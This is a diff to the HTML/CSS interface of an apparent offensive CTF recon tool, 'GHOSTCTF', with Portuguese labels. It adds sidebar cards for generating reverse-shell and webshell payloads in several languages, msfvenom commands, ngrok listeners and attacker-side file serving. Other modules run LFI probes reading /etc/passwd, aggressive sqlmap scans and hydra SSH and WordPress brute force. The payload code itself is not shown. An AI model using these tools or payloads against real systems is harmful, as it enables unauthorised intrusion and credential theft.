@@ -202,6 +202,100 @@
     background: var(--border);
   }
 
+  /* Com botão ?: título + ? na primeira linha; linha decorativa em baixo (evita o ? “no meio” da borda) */
+  .section-label.section-label--with-help {
+    flex-wrap: wrap;
+    align-items: flex-start;
+    row-gap: 8px;
+    column-gap: 8px;
+  }
+
+  .section-label.section-label--with-help::after {
+    display: none;
+  }
+
+  .section-label.section-label--with-help > .section-label-heading {
+    flex: 1 1 0;
+    min-width: 0;
+    line-height: 1.45;
+    letter-spacing: inherit;
+    text-transform: inherit;
+    font-family: inherit;
+    font-size: inherit;
+    color: inherit;
+    padding-top: 2px;
+  }
+
+  .section-label.section-label--with-help .section-label-heading .section-label-subline {
+    display: block;
+    margin-top: 2px;
+    color: var(--text-dim);
+    font-weight: 400;
+    letter-spacing: 0.06em;
+  }
+
+  .section-label.section-label--with-help .findings-help-btn {
+    flex-shrink: 0;
+    align-self: flex-start;
+  }
+
+  .section-label.section-label--with-help .section-label-rule {
+    flex: 1 1 100%;
+    width: 100%;
+    height: 1px;
+    background: var(--border);
+    margin: 0;
+    padding: 0;
+    border: 0;
+    min-height: 0;
+  }
+
+  .sidebar-module-toggle {
+    flex-shrink: 0;
+    align-self: flex-start;
+    margin-top: 2px;
+    min-width: 42px;
+    padding: 4px 10px;
+    font-family: var(--display);
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    line-height: 1.2;
+    color: var(--accent2);
+    background: rgba(0, 255, 136, 0.1);
+    border: 1px solid var(--accent2);
+    border-radius: 2px;
+    cursor: pointer;
+    transition: color 0.15s, border-color 0.15s, background 0.15s;
+  }
+
+  .sidebar-module-toggle:hover {
+    color: var(--text-bright);
+    border-color: var(--accent);
+  }
+
+  .sidebar-module-off .sidebar-module-toggle {
+    color: var(--text-dim);
+    background: var(--bg);
+    border-color: var(--border);
+  }
+
+  .sidebar-module-off .sidebar-module-body {
+    display: none !important;
+  }
+
+  .sidebar-module-off .section-label-rule {
+    display: none !important;
+  }
+
+  .sidebar-module-off .findings-help-btn {
+    display: none !important;
+  }
+
+  .sidebar-payload-card.sidebar-module-off .section-label.section-label--with-help > .section-label-heading {
+    flex: 0 1 auto;
+  }
+
   .input-wrap {
     position: relative;
     margin-bottom: 12px;
@@ -777,6 +871,156 @@
     letter-spacing: 3px;
   }
 
+  .findings-title-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  /* ? vermelho dentro de quadrado com borda azul — abre pop-up de ajuda */
+  .findings-help-btn {
+    width: 22px;
+    height: 22px;
+    padding: 0;
+    margin: 0;
+    flex-shrink: 0;
+    display: grid;
+    place-items: center;
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    line-height: 1;
+    color: var(--accent3);
+    background: rgba(5, 8, 16, 0.95);
+    border: 2px solid var(--accent4);
+    border-radius: 2px;
+    cursor: pointer;
+    box-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
+    transition: color 0.15s, border-color 0.15s, box-shadow 0.15s, transform 0.12s;
+  }
+
+  .findings-help-btn:hover {
+    color: #ff5588;
+    border-color: #33e8ff;
+    box-shadow: 0 0 14px rgba(0, 212, 255, 0.45);
+    transform: scale(1.06);
+  }
+
+  .findings-help-btn:focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: 2px;
+  }
+
+  .help-modal-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 20000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    background: rgba(2, 4, 10, 0.82);
+    backdrop-filter: blur(6px);
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transition: opacity 0.2s, visibility 0.2s;
+  }
+
+  .help-modal-overlay.is-open {
+    opacity: 1;
+    visibility: visible;
+    pointer-events: auto;
+  }
+
+  .help-modal.help-modal-wide {
+    max-width: 560px;
+    max-height: min(86vh, 680px);
+  }
+
+  .help-modal {
+    position: relative;
+    max-width: 440px;
+    width: 100%;
+    max-height: min(78vh, 560px);
+    overflow-y: auto;
+    padding: 22px 22px 20px;
+    background: linear-gradient(165deg, var(--bg3) 0%, var(--panel) 100%);
+    border: 1px solid var(--accent4);
+    box-shadow:
+      0 0 0 1px rgba(0, 212, 255, 0.12),
+      0 24px 48px rgba(0, 0, 0, 0.55);
+    font-family: var(--body);
+    font-size: 13px;
+    line-height: 1.55;
+    color: var(--text);
+  }
+
+  .help-modal h2 {
+    font-family: var(--display);
+    font-size: 14px;
+    letter-spacing: 2px;
+    color: var(--text-bright);
+    margin: 0 32px 14px 0;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .help-modal h3 {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent4);
+    margin: 18px 0 8px;
+  }
+
+  .help-modal p {
+    margin: 0 0 10px;
+    color: var(--text);
+  }
+
+  .help-modal ul {
+    margin: 0 0 12px;
+    padding-left: 18px;
+    color: var(--text-dim);
+    font-size: 12px;
+  }
+
+  .help-modal li { margin-bottom: 6px; }
+
+  .help-modal-body ol {
+    margin: 8px 0 12px;
+    padding-left: 20px;
+    color: var(--text-dim);
+    font-size: 12px;
+    line-height: 1.55;
+  }
+
+  .help-modal-body ol li { margin-bottom: 8px; }
+
+  .help-modal-close {
+    position: absolute;
+    top: 14px;
+    right: 14px;
+    width: 32px;
+    height: 32px;
+    padding: 0;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    color: var(--text-dim);
+    font-size: 20px;
+    line-height: 1;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: color 0.15s, border-color 0.15s;
+  }
+
+  .help-modal-close:hover {
+    color: var(--accent3);
+    border-color: var(--accent3);
+  }
+
   .counter {
     font-family: var(--mono);
     font-size: 12px;
@@ -1130,18 +1374,31 @@
       </div>
 
       <button class="run-btn" id="runBtn" onclick="startRecon()">▶ RUN GHOSTCTF</button>
-      <div style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
-        <div class="section-label" style="margin-bottom:8px">Decode rápido (Base64/Base32)</div>
+      <div id="decodeQuickModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+        <div class="section-label section-label--with-help" style="margin-bottom:8px">
+          <button type="button" class="sidebar-module-toggle" id="decodeQuickModuleToggle" onclick="toggleSidebarPayloadModule('decodeQuick')" aria-expanded="true" aria-controls="decodeQuickModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <span class="section-label-heading">Decode rápido (Base64/Base32)</span>
+          <button type="button" class="findings-help-btn" id="decodeHelpBtn" aria-label="Ajuda: decode rápido" title="Ajuda: decode rápido">?</button>
+          <span class="section-label-rule" aria-hidden="true"></span>
+        </div>
+        <div id="decodeQuickModuleBody" class="sidebar-module-body">
         <textarea id="decodeInput" placeholder="Cole aqui a string codificada..." style="width:100%;min-height:72px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
         <div style="display:flex;gap:8px;margin-top:8px">
           <button class="export-btn" onclick="runQuickDecode()">🔓 Decode</button>
           <button class="export-btn" onclick="runQuickHash()"># Hash</button>
           <button class="export-btn" onclick="document.getElementById('decodeInput').value=''">Limpar</button>
         </div>
+        </div>
       </div>
 
-      <div style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
-        <div class="section-label" style="margin-bottom:6px">Shell reversa — PTY</div>
+      <div id="ptyModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+        <div class="section-label section-label--with-help" style="margin-bottom:6px">
+          <button type="button" class="sidebar-module-toggle" id="ptyModuleToggle" onclick="toggleSidebarPayloadModule('pty')" aria-expanded="true" aria-controls="ptyModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <span class="section-label-heading">Shell reversa — PTY</span>
+          <button type="button" class="findings-help-btn" id="ptyHelpBtn" aria-label="Ajuda: shell reversa e PTY" title="Ajuda: shell reversa e PTY">?</button>
+          <span class="section-label-rule" aria-hidden="true"></span>
+        </div>
+        <div id="ptyModuleBody" class="sidebar-module-body">
         <p style="font-size:9px;color:var(--text-dim);margin:0 0 8px;line-height:1.45">Depois do <code style="color:var(--text-bright)">nc</code> / shell cru, cola no alvo na sequência:</p>
         <div style="display:flex;flex-direction:column;gap:6px;font-family:var(--mono);font-size:9px">
           <div style="display:flex;align-items:center;gap:8px;justify-content:space-between;flex-wrap:wrap;border:1px solid var(--border);padding:6px 8px;background:var(--bg)">
@@ -1157,12 +1414,107 @@
             <button type="button" class="export-btn" style="flex-shrink:0;padding:4px 10px;font-size:9px" onclick="copyPtyShellStep(2)">Copiar</button>
           </div>
         </div>
-        <div class="section-label" style="margin-top:12px;margin-bottom:6px">Servidor HTTP (máquina atacante)</div>
+        </div>
+      </div>
+      <div id="httpServeModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+        <div class="section-label section-label--with-help" style="margin-top:0;margin-bottom:6px">
+          <button type="button" class="sidebar-module-toggle" id="httpServeModuleToggle" onclick="toggleSidebarPayloadModule('httpServe')" aria-expanded="true" aria-controls="httpServeModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <span class="section-label-heading">Servidor HTTP<span class="section-label-subline">(máquina atacante)</span></span>
+          <button type="button" class="findings-help-btn" id="httpServeHelpBtn" aria-label="Ajuda: servidor HTTP" title="Ajuda: servidor HTTP">?</button>
+          <span class="section-label-rule" aria-hidden="true"></span>
+        </div>
+        <div id="httpServeModuleBody" class="sidebar-module-body">
         <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;font-family:var(--mono);font-size:9px">
           <label style="color:var(--text-dim);display:flex;align-items:center;gap:6px">Porta <input id="httpServePort" type="text" inputmode="numeric" value="8000" style="width:64px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
           <button type="button" class="export-btn" style="padding:4px 10px;font-size:9px" onclick="copyPythonHttpServer()">Copiar python3 -m http.server</button>
         </div>
         <p style="font-size:8px;color:var(--text-dim);margin:8px 0 0;line-height:1.4">Corre no teu Kali/host onde queres servir ficheiros; no alvo usa <code style="color:var(--text-bright)">wget</code>/<code style="color:var(--text-bright)">curl</code> para o teu IP:porta.</p>
+        </div>
+      </div>
+
+      <div id="msfvenomModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+        <div class="section-label section-label--with-help" style="margin-bottom:6px">
+          <button type="button" class="sidebar-module-toggle" id="msfvenomModuleToggle" onclick="toggleSidebarPayloadModule('msfvenom')" aria-expanded="true" aria-controls="msfvenomModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <span class="section-label-heading">Msfvenom<span class="section-label-subline">(manual — CLI)</span></span>
+          <button type="button" class="findings-help-btn" id="msfvenomManualHelpBtn" aria-label="Ajuda: Msfvenom manual" title="Ajuda: Msfvenom manual">?</button>
+          <span class="section-label-rule" aria-hidden="true"></span>
+        </div>
+        <div id="msfvenomModuleBody" class="sidebar-module-body">
+        <p style="font-size:9px;color:var(--text-dim);margin:0 0 8px;line-height:1.45">Comandos para colar no <strong>Kali</strong> (<code style="color:var(--text-bright)">msfvenom</code>, <code style="color:var(--text-bright)">msfconsole</code>). <strong>Ngrok</strong> (igual ao Wandenreich) preenche <strong>LHOST/LPORT</strong> deste bloco com o endpoint público TCP. <strong>Descarregar</strong> vai para o browser — não grava em <code style="color:var(--text-bright)">payloads/</code>.</p>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;font-family:var(--mono);font-size:9px;margin-bottom:8px">
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">LHOST <input id="msfManualLhost" type="text" placeholder="tun0 / IP" style="width:132px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">LPORT <input id="msfManualLport" type="text" inputmode="numeric" value="4444" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">Porta local (nc)<input id="msfManualLocalPort" type="text" inputmode="numeric" value="4444" title="ngrok tcp encaminha para esta porta" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px">
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfNgrokFill(false, 'manual')">Ler ngrok → LHOST/LPORT</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfNgrokFill(true, 'manual')">Iniciar ngrok tcp + preencher</button>
+        </div>
+        <p style="font-size:8px;color:var(--text-dim);margin:0 0 8px;line-height:1.4">API ngrok: <code style="color:var(--text-bright)">127.0.0.1:4040</code> · <code style="color:var(--text-bright)">GHOSTCTF_NGROK_API</code> · <code style="color:var(--text-bright)">ngrok tcp &lt;porta local&gt;</code></p>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:6px">
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="copyMsfvenomPhpRaw()">Copiar msfvenom php/reverse_php</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="copyMsfvenomLinux64()">Copiar msfvenom linux/x64</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="copyMsfHandlerPhp()">Copiar handler (php)</button>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px">
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="downloadGhostctfPayload('php_reverse_bash')">Descarregar .php reverse (bash/tcp)</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="downloadGhostctfPayload('php_webshell_min')">Descarregar cmd.php (?c=)</button>
+        </div>
+        </div>
+      </div>
+
+      <div id="wandenreichModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2);box-shadow:0 0 0 1px rgba(180,120,255,0.12) inset">
+        <div class="section-label section-label--with-help" style="margin-bottom:6px">
+          <button type="button" class="sidebar-module-toggle" id="wandenreichModuleToggle" onclick="toggleSidebarPayloadModule('wandenreich')" aria-expanded="true" aria-controls="wandenreichModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <span class="section-label-heading">Wandenreich<span class="section-label-subline">(payloads automáticos)</span></span>
+          <button type="button" class="findings-help-btn" id="wandenreichHelpBtn" aria-label="Ajuda: Wandenreich" title="Ajuda: Wandenreich">?</button>
+          <span class="section-label-rule" aria-hidden="true"></span>
+        </div>
+        <div id="wandenreichModuleBody" class="sidebar-module-body">
+        <p style="font-size:9px;color:var(--text-dim);margin:0 0 8px;line-height:1.45"><strong>LHOST / LPORT</strong> entram nos payloads que abrem <strong>TCP reverse</strong>. <strong>Webshell</strong> só grava <code style="color:var(--text-bright)">cmd.php</code>. <strong>Porta local</strong> = <code style="color:var(--text-bright)">nc</code> + <code style="color:var(--text-bright)">ngrok tcp</code>. Upload no alvo continua <strong>manual</strong>.</p>
+        <label style="display:block;font-size:9px;color:var(--text-dim);margin:0 0 6px;cursor:default">Tipo de ficheiro
+          <select id="wandenreichPayloadKind" style="width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 8px;border-radius:2px" title="Escolhe a extensão e o formato antes de gravar">
+            <optgroup label="PHP">
+              <option value="php_reverse_bash" selected>Reverse shell (.php)</option>
+              <option value="php_webshell_min">Webshell cmd.php (?c=)</option>
+            </optgroup>
+            <optgroup label="Scripts (Linux / Unix)">
+              <option value="sh_reverse_bash">Bash (.sh)</option>
+              <option value="py_reverse_tcp">Python 3 (.py)</option>
+              <option value="pl_reverse_tcp">Perl (.pl)</option>
+              <option value="rb_reverse_tcp">Ruby (.rb)</option>
+              <option value="js_node_reverse">Node.js (.js)</option>
+            </optgroup>
+            <optgroup label="Web / servlet">
+              <option value="jsp_reverse_tcp">JSP (.jsp)</option>
+            </optgroup>
+            <optgroup label="Polyglot / Windows">
+              <option value="pdf_php_polyglot_reverse">PDF + PHP polyglot (reverse)</option>
+              <option value="ps1_reverse_tcp">PowerShell reverse (.ps1)</option>
+            </optgroup>
+          </select>
+        </label>
+        <p id="wandenreichKindHint" style="font-size:8px;color:var(--accent-warn,#c98);margin:0 0 8px;line-height:1.35;min-height:1.2em"></p>
+        <div id="wandenreichLhostRow" style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;font-family:var(--mono);font-size:9px;margin-bottom:8px">
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">LHOST <input id="msfLhost" type="text" placeholder="tun0 / ngrok host" style="width:132px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">LPORT <input id="msfLport" type="text" inputmode="numeric" value="4444" title="No payload (com ngrok = porta pública TCP)" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:4px">Porta local (nc)<input id="msfLocalPort" type="text" inputmode="numeric" value="4444" title="ngrok tcp → aqui; mini-nc usa esta porta" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px">
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfNgrokFill(false, 'wandenreich')">Ler ngrok → LHOST/LPORT</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfNgrokFill(true, 'wandenreich')">Iniciar ngrok tcp + preencher</button>
+        </div>
+        <p style="font-size:8px;color:var(--text-dim);margin:0 0 8px;line-height:1.4">API ngrok: <code style="color:var(--text-bright)">127.0.0.1:4040</code> · <code style="color:var(--text-bright)">GHOSTCTF_NGROK_API</code> · <code style="color:var(--text-bright)">ngrok tcp &lt;porta local&gt;</code></p>
+        <label style="display:flex;align-items:center;gap:8px;font-size:9px;color:var(--text-dim);margin:0 0 8px;cursor:pointer">
+          <input type="checkbox" id="payloadOpenNcChk" checked style="accent-color:var(--accent)">
+          <span>Após gravar <strong>reverse</strong>, abrir mini-nc na <strong>porta local</strong></span>
+        </label>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;align-items:center">
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfSavePayloadToDisk({ openNcAfter: false })">Gravar em payloads/</button>
+          <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfSavePayloadToDisk({ openNcAfter: true })">Gravar + mini-nc</button>
+          <button type="button" class="export-btn" style="padding:4px 10px;font-size:9px;border-color:var(--accent2);color:var(--accent2)" id="wandenreichPostShellManualBtn" title="Depois da shell ligar: o que fazer no alvo" aria-label="Manual pós-shell Wandenreich">Manual</button>
+        </div>
+        </div>
       </div>
 
       <div class="section-label" style="margin-top:18px">Histórico (SQLite)</div>
@@ -1177,7 +1529,17 @@
 
     <!-- Module Selection -->
     <div class="modules-section">
-      <div class="section-label">Modules</div>
+      <div class="section-label section-label--with-help">
+        <span class="section-label-heading">Modules</span>
+        <button
+          type="button"
+          class="findings-help-btn"
+          id="modulesHelpBtn"
+          aria-label="Ajuda: módulos e opções"
+          title="Ajuda: módulos e opções"
+        >?</button>
+        <span class="section-label-rule" aria-hidden="true"></span>
+      </div>
 
       <div class="module-group">
         <div class="module-group-title">// Plataformas CTF</div>
@@ -1208,12 +1570,79 @@
         <label class="checkbox-item"><input type="checkbox" class="mod" value="exploitdb"><div class="checkbox-box"></div><span class="checkbox-text">Exploit-DB lookup (searchsploit)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="lfiProbe"><div class="checkbox-box"></div><span class="checkbox-text">LFI probe (/etc/passwd em params suspeitos)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="sqlmapProbe"><div class="checkbox-box"></div><span class="checkbox-text">SQLMap probe (--batch --level=3 --risk=3 --dbs)</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="sqlmapWsProbe"><div class="checkbox-box"></div><span class="checkbox-text">SQLMap WebSocket (ws:// nos HTML + JSON *)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="vhostSitemapProbe"><div class="checkbox-box"></div><span class="checkbox-text">VHost + Sitemap + .well-known probe</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="uploadSurfaceProbe"><div class="checkbox-box"></div><span class="checkbox-text">Upload surface (type=file / multipart no HTML)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="disclosureProbe"><div class="checkbox-box"></div><span class="checkbox-text">Disclosure Hunt (comments/files/creds)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="credReuseProbe"><div class="checkbox-box"></div><span class="checkbox-text">Credential Reuse (FTP/HTTP basic)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpFocusProbe"><div class="checkbox-box"></div><span class="checkbox-text">WordPress Focus (wp-login/xmlrpc/wp-json/plugins)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpScanProbe"><div class="checkbox-box"></div><span class="checkbox-text">WPScan probe (heavy, optional)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="etcHostsProbe" id="modEtcHostsProbe"><div class="checkbox-box"></div><span class="checkbox-text">Hostnames (/etc/hosts) — curl após recon no IP</span><span class="tag tag-med">OFF</span></label>
+        <div class="module-group-title" style="margin-top:14px">// Extended (lacunas típicas CTF4/9/Langflow)</div>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="tinyFmProbe"><div class="checkbox-box"></div><span class="checkbox-text">Tiny File Manager — credenciais CTF comuns (POST)</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="activeMqProbe"><div class="checkbox-box"></div><span class="checkbox-text">ActiveMQ — GET :8161 + dicas túnel SSH / CVE</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="extendedServiceProbe" id="modExtendedSvc"><div class="checkbox-box"></div><span class="checkbox-text">Mail + SMB — POP3/IMAP/SMTP banner + smbclient -L</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="secondaryMysqlProbe" id="modSecondaryMysql"><div class="checkbox-box"></div><span class="checkbox-text">MySQL em IPs extra (DB noutro EC2)</span><span class="tag tag-med">OFF</span></label>
+        <textarea id="secondaryMysqlHostsInput" placeholder="13.220.129.145&#10;outro.ip.valido" autocomplete="off" spellcheck="false" style="width:100%;min-height:56px;margin:4px 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="openapiProbe" id="modOpenapi"><div class="checkbox-box"></div><span class="checkbox-text">OpenAPI — /openapi.json, /v3/api-docs (Langflow/FastAPI)</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="vhostPrefixFuzz" id="modVhostFuzz"><div class="checkbox-box"></div><span class="checkbox-text">VHost prefix fuzz — compara corpo com Host: &lt;prefix&gt;.domínio</span><span class="tag tag-med">OFF</span></label>
+        <input id="vhostBaseDomainInput" type="text" placeholder="Domínio apex (ex.: projects-blogo.sy)" style="width:100%;margin:4px 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <input id="vhostFuzzExtraPrefixesInput" type="text" placeholder="Prefixos extra opcionais: foo, bar, api2" style="width:100%;margin:0 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <div class="module-group-title" style="margin-top:12px;color:var(--accent-warn,#c98)">// Agressivo (só CTF / autorização explícita)</div>
+        <div id="sshBruteModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+          <div class="section-label section-label--with-help" style="margin-bottom:6px">
+            <button type="button" class="sidebar-module-toggle" id="sshBruteModuleToggle" onclick="toggleSidebarPayloadModule('sshBrute')" aria-expanded="true" aria-controls="sshBruteModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <span class="section-label-heading">SSH brute<span class="section-label-subline">(hydra)</span></span>
+            <span class="section-label-rule" aria-hidden="true"></span>
+          </div>
+          <div id="sshBruteModuleBody" class="sidebar-module-body">
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="sshBruteProbe" id="modSshBrute"><div class="checkbox-box"></div><span class="checkbox-text">SSH brute (hydra) — subset da wordlist</span><span class="tag tag-med">OFF</span></label>
+        <textarea id="sshBruteUsersInput" placeholder="Utilizadores (max 3): root&#10;lb-test" style="width:100%;min-height:44px;margin:4px 0;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
+        <input id="sshBruteWordlistPathInput" type="text" placeholder="Caminho wordlist (ex.: /usr/share/wordlists/rockyou.txt)" style="width:100%;margin:0 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <input id="sshBruteMaxPwInput" type="number" min="20" max="500" value="150" style="width:100%;margin:0 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px" title="Máx. linhas da wordlist a usar">
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="sshBruteAutoHydra" id="modSshBruteAuto"><div class="checkbox-box"></div><span class="checkbox-text">Hydra automático (SecLists + rockyou.gz) — por último, pode demorar muito</span><span class="tag tag-med">OFF</span></label>
+        <div style="font-size:9px;color:var(--text-dim);line-height:1.45;margin:-4px 0 8px 28px;max-width:100%">
+          Só com <strong>SSH brute</strong> ligado. Corre <em>depois</em> do subset manual (se o preencheres) se ainda não houver credencial. Equivale a:
+          <code style="font-size:8px;word-break:break-all">hydra -L …/top-usernames-shortlist.txt -P …/rockyou.txt.gz … ssh://IP</code>
+          · timeout máx. (min):
+        </div>
+        <input id="sshBruteAutoTimeoutMinInput" type="number" min="5" max="120" value="30" style="width:100%;margin:0 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px" title="Tempo máximo para o hydra automático (o processo é interrompido depois disso)">
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="sshBruteSolydWordlists" id="modSshBruteSolyd"><div class="checkbox-box"></div><span class="checkbox-text">Wordlists Solyd (usersolyd + passwordsolyd) — hydra opcional</span><span class="tag tag-med">OFF</span></label>
+        <div style="font-size:9px;color:var(--text-dim);line-height:1.45;margin:-4px 0 0 28px;max-width:100%">
+          Corre <strong>depois</strong> do subset manual (se existir) e <strong>antes</strong> do Hydra automático SecLists+rockyou. Ficheiros na raiz do projeto: <code>wordlists/usersolyd.txt</code> e <code>wordlists/passwordsolyd.txt</code> (credenciais agregadas do histórico CTF Solyd).
+        </div>
+          </div>
+        </div>
+        <div id="wpBruteHydraModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+          <div class="section-label section-label--with-help" style="margin-bottom:6px">
+            <button type="button" class="sidebar-module-toggle" id="wpBruteHydraModuleToggle" onclick="toggleSidebarPayloadModule('wpBruteHydra')" aria-expanded="true" aria-controls="wpBruteHydraModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <span class="section-label-heading">WP brute<span class="section-label-subline">(hydra)</span></span>
+            <span class="section-label-rule" aria-hidden="true"></span>
+          </div>
+          <div id="wpBruteHydraModuleBody" class="sidebar-module-body">
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="hydraWpBruteProbe" id="modHydraWpBrute"><div class="checkbox-box"></div><span class="checkbox-text">WP brute (hydra) — wp-login http-post-form</span><span class="tag tag-med">OFF</span></label>
+        <textarea id="hydraWpBruteUsersInput" placeholder="Utilizadores WP (max 5): admin&#10;editor" style="width:100%;min-height:44px;margin:4px 0;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
+        <input id="hydraWpBruteWordlistPathInput" type="text" placeholder="Caminho wordlist (ex.: /usr/share/wordlists/rockyou.txt)" style="width:100%;margin:0 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <input id="hydraWpBruteMaxPwInput" type="number" min="20" max="500" value="150" style="width:100%;margin:0 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px" title="Máx. linhas da wordlist a usar">
+          </div>
+        </div>
